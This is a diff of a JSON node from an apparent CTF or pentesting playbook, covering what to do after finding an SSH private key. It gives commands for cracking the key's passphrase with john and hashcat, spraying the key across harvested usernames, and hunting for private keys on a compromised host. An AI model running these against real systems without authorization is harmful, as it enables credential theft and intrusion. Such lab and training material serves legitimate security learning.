@@ -1,18 +1,30 @@
 {
   "id": "ssh_key",
   "phase": "SSH",
-  "title": "SSH Key Found",
-  "body": "Always check permissions first — SSH will refuse a key that's world-readable. If passphrase-protected, crack it with ssh2john.",
-  "cmd": "chmod 600 id_rsa\nssh -i id_rsa user@$ip\nssh -i id_rsa -o StrictHostKeyChecking=no user@$ip\n\n# Crack passphrase\nssh2john id_rsa > id_rsa.hash\njohn id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt\nhashcat -m 22921 id_rsa.hash /usr/share/wordlists/rockyou.txt\n\n# Try all users from /etc/passwd\nfor user in $(cat users.txt); do\n  ssh -i id_rsa $user@$ip -o StrictHostKeyChecking=no 2>/dev/null && echo \"HIT: $user\"\ndone",
-  "warn": null,
+  "title": "SSH Key Found \u2014 Connect, Crack, or Abuse",
+  "body": "You have a private key. Before you try to connect, check three things: permissions (chmod 600), that the key isn't passphrase-protected (ssh-keygen -y should print the public key without asking for a passphrase), and which user it belongs to (check the comment at the end of the public key or the filename). The Boolean box pattern: root's private key was stored at /home/remi/.ssh/keys/root \u2014 world-readable, used locally with -o IdentitiesOnly=yes to SSH as root.",
+  "cmd": "# \u2550\u2550 \u2b50 HAVE A PRIVATE KEY? START HERE \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\nchmod 600 id_rsa                          # ALWAYS do this first\nssh-keygen -y -f id_rsa                  # extract public key (fails if corrupt)\n# ^ prints: ssh-rsa AAAA... user@host  -> tells you which user + comment\n\n# \u2550\u2550 CONNECT \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\nssh -i id_rsa -o IdentitiesOnly=yes user@$ip\n# -o IdentitiesOnly=yes  <-- CRITICAL: forces SSH to use ONLY this key.\n#   Without it: SSH tries every identity in your agent, hits MaxAuthTries,\n#   falls through to password prompt. This is the #1 key-auth failure mode.\n#   SYMPTOM: key is correct, permissions are right, still prompted for password.\n#   FIX: add -o IdentitiesOnly=yes.\n\n# \u2550\u2550 STILL FAILING? \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\n# 1) Verbose \u2014 see exactly what SSH is trying:\nssh -i id_rsa -o IdentitiesOnly=yes -v user@$ip 2>&1 | grep -iE 'offer|auth|key|deny|identity'\n#   'no identity pubkey loaded' -> key is corrupt/incomplete (re-copy it)\n#   'Authentications that can continue: password' -> server only allows password\n#      (check if pubkey auth is disabled server-side: /etc/ssh/sshd_config)\n\n# 2) Key is ON the box \u2014 SSH localhost instead of remote:\nssh -i /home/user/.ssh/keys/root -o IdentitiesOnly=yes root@localhost\n#   Bypasses remote auth issues entirely. If you have a shell + a key = try this.\n\n# 3) Wrong username \u2014 try other users from /etc/passwd:\nfor user in $(cat users.txt); do\n  ssh -i id_rsa -o IdentitiesOnly=yes $user@$ip -o StrictHostKeyChecking=no 2>/dev/null && echo \"HIT: $user\"\ndone\n\n# \u2550\u2550 CRACK PASSPHRASE (if key requires one) \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\nssh2john id_rsa > id_rsa.hash\njohn id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt\nhashcat -m 22921 id_rsa.hash /usr/share/wordlists/rockyou.txt\n\n# \u2550\u2550 FIND KEYS ON A BOX (post-foothold) \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\nfind /home /root /opt /var/backup /tmp -name 'id_*' -o -name '*.pem' -o -name '*.key' 2>/dev/null\nfind /home /root -path '*/.ssh/*' -type f 2>/dev/null   # includes keys/ subdirs\nls -la /home/*/.ssh/keys/ 2>/dev/null    # Boolean box pattern: keys/ subdir\n# Any readable private key = potential lateral or vertical move.\n# Check the comment (last field): root@hostname tells you which user it's for.\n\n# \u2550\u2550 LEGACY CRYPTO (old SSH server: 'no matching host key type') \u2550\u2550\u2550\u2550\nssh -i id_rsa -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedKeyTypes=+ssh-rsa user@$ip\n# Or add permanently to ~/.ssh/config:\n# Host <IP>\n#     HostKeyAlgorithms +ssh-rsa\n#     PubkeyAcceptedKeyTypes +ssh-rsa\n#     IdentitiesOnly yes",
+  "warn": "The #1 SSH key failure: SSH ignores your key and prompts for password. ALWAYS add -o IdentitiesOnly=yes when using a specific key \u2014 without it, SSH tries every agent identity and hits MaxAuthTries before your key gets a turn. If the key is on the target box and remote auth fails, SSH localhost from a shell on that box instead. chmod 600 must happen before ANY SSH attempt or the key is silently rejected. ssh-keygen -y failing = key is corrupt (re-copy with scp/cat pipe, not copy-paste).",
   "choices": [
     {
-      "label": "SSH'd in — Linux privesc",
-      "next": "linux_post_exploit"
+      "label": "Connected \u2014 Linux privesc",
+      "next": "linux_privesc_checklist"
     },
     {
-      "label": "Cracking passphrase",
+      "label": "Connected \u2014 Windows privesc",
+      "next": "win_privesc_checklist"
+    },
+    {
+      "label": "Key has passphrase \u2014 crack it",
       "next": "hashcrack"
+    },
+    {
+      "label": "Upload authorized_keys for SSH access",
+      "next": "boolean_lessons"
+    },
+    {
+      "label": "Legacy SSH crypto error",
+      "next": "ssh_only"
     }
   ]
 }
